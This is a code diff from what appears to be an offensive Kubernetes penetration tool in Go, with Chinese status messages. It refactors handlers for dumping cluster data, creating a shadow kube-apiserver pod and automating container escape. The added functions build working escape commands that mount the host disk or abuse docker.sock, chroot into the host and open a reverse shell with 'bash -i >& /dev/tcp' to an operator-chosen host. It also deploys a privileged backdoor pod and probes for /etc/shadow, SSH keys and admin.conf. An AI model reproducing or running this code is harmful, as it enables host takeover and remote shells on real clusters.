@@ -32,7 +32,7 @@ func (h *CDKHandler) buildClient(c *gin.Context) (*kubectl.Client, error) {
 		Password   string `json:"password"`
 		SkipTLS    bool   `json:"skip_tls"`
 	}
-	if err := c.ShouldBindJSON(&req); err != nil {
+	if err := bindRequestJSON(c, &req); err != nil {
 		return nil, err
 	}
 	return kubectl.NewTargetClient(req.TargetHost, req.Token, req.Username, req.Password, req.SkipTLS)
@@ -43,7 +43,7 @@ func (h *CDKHandler) buildClient(c *gin.Context) (*kubectl.Client, error) {
 func (h *CDKHandler) DumpConfigMaps(c *gin.Context) {
 	client, err := h.buildClient(c)
 	if err != nil {
-		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
+		writeHandlerError(c, err)
 		return
 	}
 	ctx, cancel := context.WithTimeout(c.Request.Context(), 15*time.Second)
@@ -79,7 +79,7 @@ func (h *CDKHandler) DumpConfigMaps(c *gin.Context) {
 func (h *CDKHandler) DumpPSP(c *gin.Context) {
 	client, err := h.buildClient(c)
 	if err != nil {
-		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
+		writeHandlerError(c, err)
 		return
 	}
 	ctx, cancel := context.WithTimeout(c.Request.Context(), 10*time.Second)
@@ -232,7 +232,7 @@ func dockerProbeTargets() []dockerProbeTarget {
 func (h *CDKHandler) ShadowAPIServer(c *gin.Context) {
 	client, err := h.buildClient(c)
 	if err != nil {
-		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
+		writeHandlerError(c, err)
 		return
 	}
 	ctx, cancel := context.WithTimeout(c.Request.Context(), 15*time.Second)
@@ -252,6 +252,13 @@ func (h *CDKHandler) ShadowAPIServer(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{"error": "Cannot list apiserver pods: " + err.Error()})
 		return
 	}
+	filteredPods := make([]corev1.Pod, 0, len(podList.Items))
+	for _, pod := range podList.Items {
+		if podLooksLikeAPIServer(pod) {
+			filteredPods = append(filteredPods, pod)
+		}
+	}
+	podList.Items = filteredPods
 	if len(podList.Items) == 0 {
 		c.JSON(http.StatusOK, gin.H{"error": "No kube-apiserver pods found in kube-system"})
 		return
@@ -268,13 +275,14 @@ func (h *CDKHandler) ShadowAPIServer(c *gin.Context) {
 		var selectedAuthMode string
 		var selectedSecurePort string
 		for _, cnt := range pod.Spec.Containers {
+			command, rawArgs := normalizeContainerEntrypoint(cnt.Command, cnt.Args)
 			args := make([]string, 0)
 			authMode := ""
 			securePort := ""
-			for _, arg := range cnt.Command {
+			for _, arg := range command {
 				args = append(args, arg)
 			}
-			for _, arg := range cnt.Args {
+			for _, arg := range rawArgs {
 				args = append(args, arg)
 				if strings.HasPrefix(arg, "--authorization-mode=") {
 					authMode = strings.TrimPrefix(arg, "--authorization-mode=")
@@ -351,9 +359,25 @@ func isPreferredAPIServerContainer(cnt corev1.Container) bool {
 	return false
 }
 
+func podLooksLikeAPIServer(pod corev1.Pod) bool {
+	if strings.Contains(pod.Name, "apiserver") {
+		return true
+	}
+	if strings.Contains(pod.Labels["component"], "apiserver") {
+		return true
+	}
+	for _, cnt := range pod.Spec.Containers {
+		if isPreferredAPIServerContainer(cnt) {
+			return true
+		}
+	}
+	return false
+}
+
 func buildShadowAPIServerPod(sourcePod corev1.Pod, sourceContainer corev1.Container) (*corev1.Pod, []string) {
 	warnings := []string{}
-	args, changed := rewriteShadowAPIServerArgs(sourceContainer.Args)
+	command, rawArgs := normalizeContainerEntrypoint(sourceContainer.Command, sourceContainer.Args)
+	args, changed := rewriteShadowAPIServerArgs(rawArgs)
 	if !changed {
 		warnings = append(warnings, "source args did not contain standard auth/port flags; shadow pod uses appended overrides")
 	}
@@ -376,6 +400,10 @@ func buildShadowAPIServerPod(sourcePod corev1.Pod, sourceContainer corev1.Contai
 	sort.Slice(volumes, func(i, j int) bool { return volumes[i].Name < volumes[j].Name })
 
 	shadowPod := &corev1.Pod{
+		TypeMeta: metav1.TypeMeta{
+			APIVersion: "v1",
+			Kind:       "Pod",
+		},
 		ObjectMeta: metav1.ObjectMeta{
 			Name:      "shadow-apiserver",
 			Namespace: sourcePod.Namespace,
@@ -396,7 +424,7 @@ func buildShadowAPIServerPod(sourcePod corev1.Pod, sourceContainer corev1.Contai
 				Name:            "kube-apiserver",
 				Image:           sourceContainer.Image,
 				ImagePullPolicy: sourceContainer.ImagePullPolicy,
-				Command:         append([]string(nil), sourceContainer.Command...),
+				Command:         command,
 				Args:            args,
 				VolumeMounts:    mounts,
 			}},
@@ -406,6 +434,17 @@ func buildShadowAPIServerPod(sourcePod corev1.Pod, sourceContainer corev1.Contai
 		shadowPod.Spec.DNSPolicy = corev1.DNSClusterFirstWithHostNet
 	}
 	return shadowPod, warnings
+}
+
+func normalizeContainerEntrypoint(command, args []string) ([]string, []string) {
+	switch {
+	case len(command) > 1 && len(args) == 0:
+		return []string{command[0]}, append([]string(nil), command[1:]...)
+	case len(command) == 0 && len(args) > 1 && !strings.HasPrefix(args[0], "-"):
+		return []string{args[0]}, append([]string(nil), args[1:]...)
+	default:
+		return append([]string(nil), command...), append([]string(nil), args...)
+	}
 }
 
 func rewriteShadowAPIServerArgs(sourceArgs []string) ([]string, bool) {
@@ -632,6 +671,10 @@ func buildEscapePodObject(req escapePodRequest) *corev1.Pod {
 	}
 
 	pod := &corev1.Pod{
+		TypeMeta: metav1.TypeMeta{
+			APIVersion: "v1",
+			Kind:       "Pod",
+		},
 		ObjectMeta: metav1.ObjectMeta{
 			Name:      fmt.Sprintf("cdk-escape-%s", mode),
 			Namespace: req.Namespace,
@@ -829,7 +872,7 @@ func getEscapeDescription(mode string) string {
 func (h *CDKHandler) AssessEscape(c *gin.Context) {
 	client, err := h.buildClient(c)
 	if err != nil {
-		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
+		writeHandlerError(c, err)
 		return
 	}
 	ctx, cancel := context.WithTimeout(c.Request.Context(), 20*time.Second)
@@ -1035,37 +1078,7 @@ func (h *CDKHandler) EvaluatePod(c *gin.Context) {
 	checks := []gin.H{}
 
 	// CDK-style evaluate script: runs inside pod, outputs JSON lines
-	evalScript := `#!/bin/sh
-echo "=== CDK EVALUATE START ==="
-SECCOMP=$(cat /proc/1/status 2>/dev/null | grep -i seccomp | tr -d '\n\r' | sed 's/\t/ /g')
-echo "{\"check\":\"seccomp\",\"result\":\"$SECCOMP\"}"
-CAPEFF=$(cat /proc/1/status 2>/dev/null | grep -i capeff | tr -d '\n\r')
-echo "{\"check\":\"capabilities\",\"result\":\"$CAPEFF\"}"
-CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -3 | tr '\n' ' ')
-echo "{\"check\":\"cgroup\",\"result\":\"$CGROUP\"}"
-if [ -e /dev/sda ] || [ -e /dev/vda ] || [ -e /dev/xvda ]; then DEV="HOST_DEVICES_ACCESSIBLE"; else DEV="no_host_devices"; fi
-echo "{\"check\":\"privileged_devices\",\"result\":\"$DEV\"}"
-if [ -S /var/run/docker.sock ]; then DS="DOCKER_SOCK_FOUND"; else DS="not_found"; fi
-echo "{\"check\":\"docker_sock\",\"result\":\"$DS\"}"
-HMOUNTS=$(mount 2>/dev/null | grep -E '(hostPath|/host|/mnt)' | head -5 | tr '\n' ' ')
-echo "{\"check\":\"host_mounts\",\"result\":\"$HMOUNTS\"}"
-PROCS=$(ls /proc/1/root/proc 2>/dev/null | wc -l)
-echo "{\"check\":\"host_pid\",\"result\":\"$PROCS procs visible\"}"
-if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then SA="mounted"; else SA="not_mounted"; fi
-echo "{\"check\":\"sa_token\",\"result\":\"$SA\"}"
-K8S_HOST=${KUBERNETES_SERVICE_HOST:-127.0.0.1}
-K8S_PORT=${KUBERNETES_SERVICE_PORT:-443}
-API=$(timeout 2 curl -sk "https://${K8S_HOST}:${K8S_PORT}/api" 2>/dev/null | head -1 | grep -c paths || echo 0)
-echo "{\"check\":\"k8s_api_accessible\",\"result\":\"$API\"}"
-SFILES=""
-for f in /etc/shadow /root/.ssh/id_rsa /etc/kubernetes/admin.conf; do [ -f "$f" ] && SFILES="$SFILES $f"; done
-echo "{\"check\":\"sensitive_files\",\"result\":\"$SFILES\"}"
-PROCS_LIST=$(ps aux 2>/dev/null | awk '{print $11}' | grep -v '^\[' | sort -u | head -10 | tr '\n' ' ')
-echo "{\"check\":\"processes\",\"result\":\"$PROCS_LIST\"}"
-NET=$(ss -tlnp 2>/dev/null | tail -n +2 | head -6 | awk '{print $4}' | tr '\n' ' ')
-echo "{\"check\":\"network_listening\",\"result\":\"$NET\"}"
-echo "=== CDK EVALUATE END ==="
-`
+	evalScript := buildEvaluatePodScript()
 	// Respect the selected container when provided; otherwise fall back to the first pod container.
 	containerName := strings.TrimSpace(req.Container)
 	if containerName == "" {
@@ -1110,6 +1123,50 @@ echo "=== CDK EVALUATE END ==="
 		"summary":   summary,
 		"raw":       output,
 	})
+}
+
+func buildEvaluatePodScript() string {
+	return `#!/bin/sh
+echo "=== CDK EVALUATE START ==="
+SECCOMP=$(cat /proc/1/status 2>/dev/null | grep -i seccomp | tr -d '\n\r' | sed 's/\t/ /g')
+echo "{\"check\":\"seccomp\",\"result\":\"$SECCOMP\"}"
+CAPEFF=$(cat /proc/1/status 2>/dev/null | grep -i capeff | tr -d '\n\r')
+echo "{\"check\":\"capabilities\",\"result\":\"$CAPEFF\"}"
+CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -3 | tr '\n' ' ')
+echo "{\"check\":\"cgroup\",\"result\":\"$CGROUP\"}"
+if [ -e /dev/sda ] || [ -e /dev/vda ] || [ -e /dev/xvda ]; then DEV="HOST_DEVICES_ACCESSIBLE"; else DEV="no_host_devices"; fi
+echo "{\"check\":\"privileged_devices\",\"result\":\"$DEV\"}"
+if [ -S /var/run/docker.sock ]; then DS="DOCKER_SOCK_FOUND"; else DS="not_found"; fi
+echo "{\"check\":\"docker_sock\",\"result\":\"$DS\"}"
+HMOUNTS=$(mount 2>/dev/null | grep -E ' on /(host|mnt|rootfs|tmp/host_|var/lib/kubelet|var/lib/docker|run/containerd|var/run/docker.sock)| /var/run/docker.sock ' | grep -Ev ' on /(etc/hosts|etc/hostname|etc/resolv.conf) ' | head -5 | tr '\n' ' ')
+echo "{\"check\":\"host_mounts\",\"result\":\"$HMOUNTS\"}"
+PROCS=$(ls /proc/1/root/proc 2>/dev/null | wc -l)
+echo "{\"check\":\"host_pid\",\"result\":\"$PROCS procs visible\"}"
+if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then SA="mounted"; else SA="not_mounted"; fi
+echo "{\"check\":\"sa_token\",\"result\":\"$SA\"}"
+K8S_HOST=${KUBERNETES_SERVICE_HOST:-127.0.0.1}
+K8S_PORT=${KUBERNETES_SERVICE_PORT:-443}
+if command -v curl >/dev/null 2>&1; then
+  API=$(curl -sk --max-time 2 "https://${K8S_HOST}:${K8S_PORT}/version" 2>/dev/null | grep -c gitVersion || echo 0)
+elif command -v wget >/dev/null 2>&1; then
+  API=$(wget --no-check-certificate -T 2 -qO- "https://${K8S_HOST}:${K8S_PORT}/version" 2>/dev/null | grep -c gitVersion || echo 0)
+else
+  API="no_http_client"
+fi
+echo "{\"check\":\"k8s_api_accessible\",\"result\":\"$API\"}"
+SFILES=""
+for f in /etc/shadow /root/.ssh/id_rsa /etc/kubernetes/admin.conf; do [ -f "$f" ] && SFILES="$SFILES $f"; done
+echo "{\"check\":\"sensitive_files\",\"result\":\"$SFILES\"}"
+if ps -eo comm >/dev/null 2>&1; then
+  PROCS_LIST=$(ps -eo comm 2>/dev/null | sed '1d' | grep -v '^\[' | grep -v '^COMMAND$' | sort -u | head -10 | tr '\n' ' ')
+else
+  PROCS_LIST=$(ps 2>/dev/null | awk 'NR>1{print $NF}' | grep -v '^\[' | grep -v '^COMMAND$' | sort -u | head -10 | tr '\n' ' ')
+fi
+echo "{\"check\":\"processes\",\"result\":\"$PROCS_LIST\"}"
+NET=$(ss -tlnp 2>/dev/null | tail -n +2 | head -6 | awk '{print $4}' | tr '\n' ' ')
+echo "{\"check\":\"network_listening\",\"result\":\"$NET\"}"
+echo "=== CDK EVALUATE END ==="
+`
 }
 
 func evaluatePodSummary(checks []gin.H) gin.H {
@@ -1185,6 +1242,52 @@ func autoEscapeHostCommand(lhost, lport string) string {
 	return fmt.Sprintf("%s; (bash -i >& /dev/tcp/%s/%s 0>&1) >/dev/null 2>&1 &", base, host, port)
 }
 
+func autoEscapeDiskChrootCommand(lhost, lport string) string {
+	hostCmd := shellQuoteSingle(autoEscapeHostCommand(lhost, lport))
+	return fmt.Sprintf("command -v mount >/dev/null 2>&1 || { echo \"MISSING_BINARY:mount\"; exit 0; }; command -v chroot >/dev/null 2>&1 || { echo \"MISSING_BINARY:chroot\"; exit 0; }; fdisk -l 2>/dev/null | head -5; mkdir -p /tmp/host_escape; DEV=$(ls /dev/sd*1 /dev/vd*1 /dev/xvd*1 2>/dev/null | head -1); if [ -n \"$DEV\" ]; then mount $DEV /tmp/host_escape 2>&1 && echo MOUNT_OK && (chroot /tmp/host_escape /bin/sh -c %s 2>&1) || echo CHROOT_FAILED; else echo NO_HOST_DISK; fi", hostCmd)
+}
+
+func autoEscapeMountedHostCommand(hostMountPath, lhost, lport string) string {
+	mountPath := strings.TrimSpace(hostMountPath)
+	if mountPath == "" {
+		mountPath = "/host"
+	}
+	hostCmd := shellQuoteSingle(autoEscapeHostCommand(lhost, lport))
+	return fmt.Sprintf("command -v chroot >/dev/null 2>&1 || { echo \"MISSING_BINARY:chroot\"; exit 0; }; test -d %s/bin || { echo HOST_MOUNT_BROKEN; exit 0; }; chroot %s /bin/sh -c %s 2>&1 && echo MOUNT_OK || echo CHROOT_FAILED", shellQuoteSingle(mountPath), shellQuoteSingle(mountPath), hostCmd)
+}
+
+func hasHostRootAccess(reasons []string) bool {
+	for _, reason := range reasons {
+		if reason == "hostPath:/" {
+			return true
+		}
+	}
+	return false
+}
+
+func buildDockerSockAutoEscapeCommand(socketPath, lhost, lport string) string {
+	dockerSockPath := strings.TrimSpace(socketPath)
+	if dockerSockPath == "" {
+		dockerSockPath = "/var/run/docker.sock"
+	}
+	hostCmd := shellQuoteSingle(autoEscapeHostCommand(lhost, lport))
+	containerCmd := fmt.Sprintf("chroot /host /bin/sh -c %s", hostCmd)
+	payload, err := json.Marshal(map[string]interface{}{
+		"Image": "alpine:3.20",
+		"Cmd":   []string{"/bin/sh", "-c", containerCmd},
+		"HostConfig": map[string]interface{}{
+			"Binds":       []string{"/:/host"},
+			"Privileged":  true,
+			"PidMode":     "host",
+			"NetworkMode": "host",
+		},
+	})
+	if err != nil {
+		return `echo "DOCKER_PAYLOAD_BUILD_FAILED"`
+	}
+	return fmt.Sprintf(`SOCK=%s; if command -v docker >/dev/null 2>&1; then docker -H unix://$SOCK run --rm --privileged --pid=host --net=host -v /:/host alpine:3.20 sh -c %s 2>&1 && echo DOCKER_CONTAINER_CREATED || echo DOCKER_ESCAPE_FAILED; elif command -v curl >/dev/null 2>&1; then BODY=%s; RESP=$(curl -s --unix-socket "$SOCK" -X POST -H "Content-Type: application/json" -d "$BODY" http://localhost/containers/create 2>/dev/null); CID=$(printf '%%s' "$RESP" | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'); if [ -n "$CID" ]; then curl -s --unix-socket "$SOCK" -X POST http://localhost/containers/$CID/start >/dev/null 2>&1 || echo DOCKER_ESCAPE_FAILED; curl -s --unix-socket "$SOCK" http://localhost/containers/$CID/wait >/dev/null 2>&1; curl -s --unix-socket "$SOCK" "http://localhost/containers/$CID/logs?stdout=1&stderr=1" 2>/dev/null; echo DOCKER_CONTAINER_CREATED; else echo DOCKER_ESCAPE_FAILED; echo "$RESP"; fi; else echo "MISSING_BINARY:docker_or_curl"; fi`, shellQuoteSingle(dockerSockPath), hostCmd, shellQuoteSingle(string(payload)))
+}
+
 type autoEscapeRequest struct {
 	TargetHost string `json:"target_host" binding:"required"`
 	Token      string `json:"token"`
@@ -1238,52 +1341,103 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 
 	// Find best escape candidate
 	type candidate struct {
-		pod     corev1.Pod
-		score   int
-		reasons []string
+		pod           corev1.Pod
+		containerName string
+		hostRootPath  string
+		dockerSock    string
+		score         int
+		reasons       []string
 	}
 	candidates := []candidate{}
 	for _, pod := range pods.Items {
-		score := 0
-		reasons := []string{}
-		for _, c := range pod.Spec.Containers {
-			if c.SecurityContext != nil && c.SecurityContext.Privileged != nil && *c.SecurityContext.Privileged {
-				score += 100
-				reasons = append(reasons, "privileged")
-			}
-		}
+		baseScore := 0
+		baseReasons := []string{}
+		hostPathVolumes := map[string]string{}
 		for _, v := range pod.Spec.Volumes {
 			if v.HostPath != nil {
-				score += 70
-				reasons = append(reasons, "hostPath:"+v.HostPath.Path)
+				hostPathVolumes[v.Name] = v.HostPath.Path
 			}
 		}
 		if pod.Spec.HostPID {
-			score += 60
-			reasons = append(reasons, "hostPID")
+			baseScore += 60
+			baseReasons = append(baseReasons, "hostPID")
 		}
 		if pod.Spec.HostNetwork {
-			score += 50
-			reasons = append(reasons, "hostNetwork")
+			baseScore += 50
+			baseReasons = append(baseReasons, "hostNetwork")
 		}
+		if pod.Spec.HostIPC {
+			baseScore += 40
+			baseReasons = append(baseReasons, "hostIPC")
+		}
+
+		bestContainerScore := -1
+		bestContainerName := ""
+		bestContainerReasons := []string{}
+		bestHostRootPath := ""
+		bestDockerSockPath := ""
 		for _, c := range pod.Spec.Containers {
+			containerScore := 0
+			containerReasons := []string{}
+			containerHostRootPath := ""
+			containerDockerSockPath := ""
 			if c.SecurityContext != nil && c.SecurityContext.Capabilities != nil {
 				for _, cap := range c.SecurityContext.Capabilities.Add {
 					if string(cap) == "SYS_ADMIN" {
-						score += 80
-						reasons = append(reasons, "CAP_SYS_ADMIN")
+						containerScore += 80
+						containerReasons = append(containerReasons, "CAP_SYS_ADMIN")
 					}
 				}
 			}
+			if c.SecurityContext != nil && c.SecurityContext.Privileged != nil && *c.SecurityContext.Privileged {
+				containerScore += 100
+				containerReasons = append(containerReasons, "privileged")
+			}
 			for _, vm := range c.VolumeMounts {
+				if hostPath, ok := hostPathVolumes[vm.Name]; ok {
+					containerScore += 70
+					containerReasons = append(containerReasons, "hostPath:"+hostPath)
+					if hostPath == "/" && containerHostRootPath == "" {
+						containerHostRootPath = vm.MountPath
+					}
+					if hostPath == "/var/run/docker.sock" && containerDockerSockPath == "" {
+						containerDockerSockPath = vm.MountPath
+					}
+				}
 				if strings.Contains(vm.MountPath, "docker.sock") {
-					score += 90
-					reasons = append(reasons, "docker.sock")
+					containerScore += 90
+					containerReasons = append(containerReasons, "docker.sock")
+					if containerDockerSockPath == "" {
+						containerDockerSockPath = vm.MountPath
+					}
 				}
 			}
+			if containerScore > bestContainerScore {
+				bestContainerScore = containerScore
+				bestContainerName = c.Name
+				bestContainerReasons = append([]string(nil), containerReasons...)
+				bestHostRootPath = containerHostRootPath
+				bestDockerSockPath = containerDockerSockPath
+			}
+		}
+		score := baseScore
+		reasons := append([]string(nil), baseReasons...)
+		if bestContainerScore > 0 {
+			score += bestContainerScore
+			reasons = append(reasons, bestContainerReasons...)
+		}
+		if bestContainerName == "" && len(pod.Spec.Containers) > 0 {
+			bestContainerName = pod.Spec.Containers[0].Name
 		}
 		if score > 0 {
-			candidates = append(candidates, candidate{pod: pod, score: score, reasons: reasons})
+			candidates = append(candidates, candidate{
+				pod:           pod,
+				containerName: bestContainerName,
+				hostRootPath:  bestHostRootPath,
+				dockerSock:    bestDockerSockPath,
+				score:         score,
+				reasons:       reasons,
+			})
 		}
 	}
 	sort.Slice(candidates, func(i, j int) bool { return candidates[i].score > candidates[j].score })
@@ -1295,7 +1449,7 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 	}
 
 	target := candidates[0]
-	steps = append(steps, gin.H{"step": 2, "action": "best_candidate", "pod": target.pod.Namespace + "/" + target.pod.Name, "score": target.score, "reasons": target.reasons})
+	steps = append(steps, gin.H{"step": 2, "action": "best_candidate", "pod": target.pod.Namespace + "/" + target.pod.Name, "container": target.containerName, "score": target.score, "reasons": target.reasons, "host_root_mount": target.hostRootPath, "docker_sock_mount": target.dockerSock})
 
 	if req.DryRun {
 		steps = append(steps, gin.H{"step": 3, "action": "dry_run", "result": "Would escape via " + target.pod.Namespace + "/" + target.pod.Name})
@@ -1304,178 +1458,178 @@ func (h *CDKHandler) AutoEscape(c *gin.Context) {
 	}
 
 	// Stage 1: Try native escape in the best candidate pod
-		execCtx, execCancel := context.WithTimeout(ctx, 30*time.Second)
-		defer execCancel()
+	execCtx, execCancel := context.WithTimeout(ctx, 30*time.Second)
+	defer execCancel()
 
-		method := "none"
-		var stage1Cmd string
-		if containsStr(target.reasons, "docker.sock") {
-			method = "docker_sock_api"
-			hostCmd := shellQuoteSingle(autoEscapeHostCommand(req.LHOST, req.LPORT))
-			stage1Cmd = fmt.Sprintf(`command -v docker >/dev/null 2>&1 || { echo "MISSING_BINARY:docker"; exit 0; }; docker -H unix:///var/run/docker.sock run --rm --privileged --pid=host --net=host -v /:/host alpine:3.20 sh -c "chroot /host /bin/sh -c %s" 2>&1 && echo DOCKER_CONTAINER_CREATED || echo DOCKER_ESCAPE_FAILED`, hostCmd)
-		} else if containsStr(target.reasons, "privileged") {
-			method = "chroot_or_cgroup"
-			stage1Cmd = "command -v mount >/dev/null 2>&1 || { echo \"MISSING_BINARY:mount\"; exit 0; }; command -v chroot >/dev/null 2>&1 || { echo \"MISSING_BINARY:chroot\"; exit 0; }; fdisk -l 2>/dev/null | head -5; mkdir -p /tmp/host_escape; DEV=$(ls /dev/sd*1 /dev/vd*1 /dev/xvd*1 2>/dev/null | head -1); if [ -n \"$DEV\" ]; then mount $DEV /tmp/host_escape 2>&1 && echo MOUNT_OK && (chroot /tmp/host_escape /bin/sh -c 'echo ESCAPED_TO_HOST; id; hostname' 2>&1) || echo CHROOT_FAILED; else echo NO_HOST_DISK; fi"
-		} else {
-			method = "manual_only"
-			stage1Cmd = "echo 'No automated escape path for this pod. Try manual methods.'; id; cat /proc/1/status 2>/dev/null | grep CapEff"
-		}
-
-		containerName := ""
-		if len(target.pod.Spec.Containers) > 0 {
-			containerName = target.pod.Spec.Containers[0].Name
-		}
-		escResult, execErr := client.ExecInPodResult(execCtx, target.pod.Namespace, target.pod.Name, containerName, []string{"sh", "-c", stage1Cmd})
-		out := ""
-		if execErr != nil {
-			out = "exec error: " + execErr.Error()
-			if escResult != nil {
-				out += "\nstdout: " + escResult.Stdout + "\nstderr: " + escResult.Stderr
-			}
-		} else {
-			out = escResult.Stdout
-			if escResult.Stderr != "" {
-				out += "\n" + escResult.Stderr
-			}
-		}
-
-		if strings.Contains(out, "ESCAPED_TO_HOST") {
-			escaped = true
-			evidence = out
-		}
-		hostFSMounted = strings.Contains(out, "MOUNT_OK")
-		hostContainerCreated = strings.Contains(out, "DOCKER_CONTAINER_CREATED")
-
-		step3Output := out
-		if len(step3Output) > 500 {
-			step3Output = step3Output[:500] + "..."
-		}
-		step := gin.H{"step": 3, "action": "execute", "method": method, "escaped": escaped, "output": step3Output}
-		if hostFSMounted {
-			step["host_fs_mounted"] = true
-		}
-		if hostContainerCreated {
-			step["host_container_created"] = true
-		}
-		steps = append(steps, step)
-
-		// Stage 2: If native escape failed due to missing binaries, auto-deploy a privileged escape pod
-		if !escaped && (strings.Contains(out, "MISSING_BINARY:") || strings.Contains(out, "DOCKER_ESCAPE_FAILED") || strings.Contains(out, "NO_HOST_DISK") || strings.Contains(out, "CHROOT_FAILED")) {
-			missing := extractMissingBinary(out)
-			steps = append(steps, gin.H{"step": 4, "action": "deploy_escape_pod", "result": fmt.Sprintf("native escape failed (missing %s), auto-deploying temporary privileged pod", missing)})
-
-			escapePodName := "k8spen-escape-" + fmt.Sprintf("%d", time.Now().UnixNano()%100000)
-			escapeNs := target.pod.Namespace
-			if escapeNs == "" {
-				escapeNs = "default"
-			}
-			escapePod := kubectl.BuildBackdoorPod(escapePodName, escapeNs, "alpine:3.20", "/host", target.pod.Spec.NodeName)
-
-			_, createErr := client.CreatePrivilegedPod(ctx, escapeNs, escapePod)
-			if createErr != nil {
-				steps = append(steps, gin.H{"step": 4, "action": "deploy_failed", "error": createErr.Error()})
-			} else {
-				// Wait for pod to be running
-				waitCtx, waitCancel := context.WithTimeout(ctx, 30*time.Second)
-				defer waitCancel()
-				running := false
-				for i := 0; i < 15; i++ {
-					if waitCtx.Err() != nil {
-						break
-					}
-					p, getErr := client.GetPod(waitCtx, escapeNs, escapePodName)
-					if getErr == nil && p.Status.Phase == "Running" {
-						running = true
-						break
-					}
-					time.Sleep(2 * time.Second)
-				}
-
-				if !running {
-					steps = append(steps, gin.H{"step": 4, "action": "pod_not_ready", "error": "escape pod did not become ready in time"})
-				} else {
-					steps = append(steps, gin.H{"step": 4, "action": "escape_pod_ready", "pod": escapeNs + "/" + escapePodName})
-
-					// Execute chroot escape in the escape pod
-					stage2Cmd := "test -d /host/bin || { echo HOST_MOUNT_BROKEN; exit 0; }; chroot /host /bin/sh -c 'echo ESCAPED_TO_HOST; id; hostname' 2>&1 && echo MOUNT_OK || echo CHROOT_FAILED"
-					stage2Ctx, stage2Cancel := context.WithTimeout(ctx, 20*time.Second)
-					defer stage2Cancel()
-					s2Result, s2Err := client.ExecInPodResult(stage2Ctx, escapeNs, escapePodName, "backdoor", []string{"sh", "-c", stage2Cmd})
-					s2Out := ""
-					if s2Err != nil {
-						s2Out = "stage2 exec error: " + s2Err.Error()
-						if s2Result != nil {
-							s2Out += "\nstdout: " + s2Result.Stdout
-						}
-					} else {
-						s2Out = s2Result.Stdout
-						if s2Result.Stderr != "" {
-							s2Out += "\n" + s2Result.Stderr
-						}
-					}
-
-					if strings.Contains(s2Out, "ESCAPED_TO_HOST") {
-						escaped = true
-						evidence = s2Out
-						hostFSMounted = true
-					}
-
-					s2Preview := s2Out
-					if len(s2Preview) > 500 {
-						s2Preview = s2Preview[:500] + "..."
-					}
-					steps = append(steps, gin.H{"step": 5, "action": "chroot_escape", "escaped": escaped, "output": s2Preview})
-
-					// Clean up escape pod
-					if delErr := client.DeletePod(context.Background(), escapeNs, escapePodName); delErr != nil {
-						steps = append(steps, gin.H{"step": 6, "action": "cleanup", "error": "failed to delete escape pod: " + delErr.Error()})
-					} else {
-						steps = append(steps, gin.H{"step": 6, "action": "cleanup", "result": "escape pod deleted"})
-					}
-				}
-			}
-		}
-
-		resp := gin.H{
-			"escaped":                escaped,
-			"steps":                  steps,
-			"pod_used":               target.pod.Namespace + "/" + target.pod.Name,
-			"evidence":               evidence,
-			"host_fs_mounted":        hostFSMounted,
-			"host_container_created": hostContainerCreated,
-		}
-		if !escaped && execErr != nil {
-			resp["error"] = "exec into pod failed: " + execErr.Error()
-			resp["full_output"] = out
-		}
-		if !escaped && (strings.Contains(out, "MISSING_BINARY:") || strings.Contains(out, "DOCKER_ESCAPE_FAILED") || strings.Contains(out, "NO_HOST_DISK") || strings.Contains(out, "CHROOT_FAILED")) {
-			stage2Ran := len(steps) >= 5 // step 4 = deploy, step 5 = exec
-			if strings.Contains(out, "MISSING_BINARY:") {
-				missing := extractMissingBinary(out)
-				if stage2Ran {
-					resp["error"] = "两阶段逃逸均失败: Stage1 缺少 " + missing + " → 已自动部署特权Pod但逃逸未成功"
-					resp["hint"] = "特权逃逸 Pod 已部署但 chroot 未成功。检查 /host 挂载是否完整，或手动 exec 进入逃逸 Pod 排查"
-				} else {
-					resp["error"] = "容器缺少必要二进制: " + missing
-					resp["hint"] = "已自动部署特权逃逸 Pod 执行 chroot 逃逸。如仍失败，手动进入逃逸 Pod 尝试 cgroup release_agent"
-				}
-				resp["missing_binary"] = missing
-			} else if strings.Contains(out, "DOCKER_ESCAPE_FAILED") {
-				resp["error"] = "Docker API 逃逸失败 (docker.sock 存在但 docker 命令执行失败)"
-				resp["hint"] = "检查 Docker daemon 是否正常运行，或通过 Stage2 部署特权逃逸 Pod"
-			} else {
-				resp["error"] = "原生逃逸失败: " + method
-				resp["hint"] = "已自动部署特权逃逸 Pod 尝试 chroot 路径"
-			}
-		}
-		if hostFSMounted && !escaped {
-			resp["note"] = "宿主机文件系统已挂载，但还没有看到明确的宿主机 shell / chroot 成功证据。"
-		}
-		if hostContainerCreated && !escaped {
-			resp["note"] = "已通过 docker.sock 创建宿主机侧特权容器，但当前返回还没有直接宿主机 shell 证据。"
-		}
-		c.JSON(http.StatusOK, resp)
+	method := "none"
+	var stage1Cmd string
+	if containsStr(target.reasons, "docker.sock") {
+		method = "docker_sock_api"
+		stage1Cmd = buildDockerSockAutoEscapeCommand(target.dockerSock, req.LHOST, req.LPORT)
+	} else if hasHostRootAccess(target.reasons) {
+		method = "mounted_host_chroot"
+		stage1Cmd = autoEscapeMountedHostCommand(target.hostRootPath, req.LHOST, req.LPORT)
+	} else if containsStr(target.reasons, "privileged") {
+		method = "chroot_or_cgroup"
+		stage1Cmd = autoEscapeDiskChrootCommand(req.LHOST, req.LPORT)
+	} else {
+		method = "manual_only"
+		stage1Cmd = "echo 'No automated escape path for this pod. Try manual methods.'; id; cat /proc/1/status 2>/dev/null | grep CapEff"
 	}
+
+	containerName := target.containerName
+	escResult, execErr := client.ExecInPodResult(execCtx, target.pod.Namespace, target.pod.Name, containerName, []string{"sh", "-c", stage1Cmd})
+	out := ""
+	if execErr != nil {
+		out = "exec error: " + execErr.Error()
+		if escResult != nil {
+			out += "\nstdout: " + escResult.Stdout + "\nstderr: " + escResult.Stderr
+		}
+	} else {
+		out = escResult.Stdout
+		if escResult.Stderr != "" {
+			out += "\n" + escResult.Stderr
+		}
+	}
+
+	if strings.Contains(out, "ESCAPED_TO_HOST") {
+		escaped = true
